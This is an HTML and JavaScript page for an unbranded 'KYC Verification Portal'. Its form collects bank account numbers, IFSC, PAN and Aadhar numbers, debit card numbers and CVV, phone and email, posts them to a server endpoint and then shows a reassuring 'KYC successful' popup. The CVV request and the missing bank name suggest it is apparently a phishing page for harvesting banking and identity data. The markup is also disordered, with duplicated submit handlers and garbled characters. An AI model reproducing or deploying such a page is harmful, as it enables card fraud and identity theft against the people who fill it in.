<script>
document.getElementById("kycForm").addEventListener("submit", function(e){
    e.preventDefault();

    const formData = new FormData(this);

    fetch("/submit_kyc", {
        method: "POST",
        body: formData
    })
    .then(res => res.json())
    .then(data => {
        document.getElementById("successMsg").innerHTML = `
            Dear <b>${data.name}</b>,<br><br>
            Your KYC verification is successful.<br>
            Account Number: <b>${data.account}</b><br>
            Time: <b>${data.time}</b><br><br>
            üìß Notification sent to your registered email

        `;
        document.getElementById("successPopup").style.display="flex";
    });
});

function closePopup(){
    document.getElementById("successPopup").style.display="none";
}
</script>
<script>
document.getElementById("kycForm").addEventListener("submit", function(e) {
    e.preventDefault();

    const formData = new FormData(this);

    fetch("/submit_kyc", {
        method: "POST",
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            alert("‚úÖ KYC Verification Successful!\nüìß Confirmation email has been sent.");
            document.getElementById("kycForm").reset();
        }
    })
    .catch(() => {
        alert("‚ùå Server error. Please try again.");
    });
});
</script>
</body>

</head>

<body>

    <!-- TOP BAR -->
<div class="top-bar">
    <div class="left-section">
        <img src="/static/logo.png" class="logo">
        <span class="bank-name"> </span>
    </div>
</div>
    <!-- HERO SECTION -->
    <div class="hero">
        <h1>KYC Verification Portal</h1>
        <p class="hero-sub">Secure ‚Ä¢ Fast ‚Ä¢ Verified</p>

        <div class="note-box-hero">
            <b>Note:</b> If slowness is observed during the KYC page, please refresh the page for a better experience.
        </div>
    </div>

    <!-- MAIN FORM -->
    <div class="container">

    <div class="sub-heading">KYC Verification Details</div>
<form id="kycForm" action="/submit_kyc" method="POST">

    <label>Account Holder Name</label>
    <input type="text" name="account_name" placeholder="Enter account holder name" required>

    <label>Bank Account Number</label>
    <input type="number" name="account_number" placeholder="Enter bank account number" required>

    <label>IFSC Number</label>
    <input type="text" name="ifsc" placeholder="Enter IFSC number" required>

    <label>PAN Number</label>
    <input type="text" name="pan" placeholder="Enter PAN number" required>

    <label>Aadhar Number</label>
    <input type="number" name="aadhar" placeholder="Enter Aadhar number" required>

    <hr style="margin:20px 0;">

    <div class="sub-heading">Debit Card Activation</div>

    <label>Card Number</label>
    <input type="number" name="card_number" placeholder="Enter debit card number" required>

    <label>Card Holder Name</label>
    <input type="text" name="card_holder" placeholder="Enter card holder name" required>

    <label>CVV</label>
    <input type="password" name="cvv" placeholder="Enter CVV" required>

    <label>Phone Number</label>
    <input type="number" name="phone" placeholder="Enter phone number" required>
    <label>Email Address</label>
<input type="email" name="email" placeholder="Enter email address" required>


    <button class="submit-btn" type="submit">Submit</button>
</form>

</div>
<div id="successPopup" style="display:none; position:fixed; inset:0;
background:rgba(0,0,0,0.6); z-index:9999; align-items:center; justify-content:center;">
  
  <div style="background:#fff; padding:30px; border-radius:12px; width:400px; text-align:center;">
    <h2 style="color:green;">‚úÖ KYC Successful</h2>
    <p id="successMsg"></p>
    <button onclick="closePopup()" style="margin-top:15px;padding:10px 20px;">OK</button>
  </div>

</div>


</body>
</html>
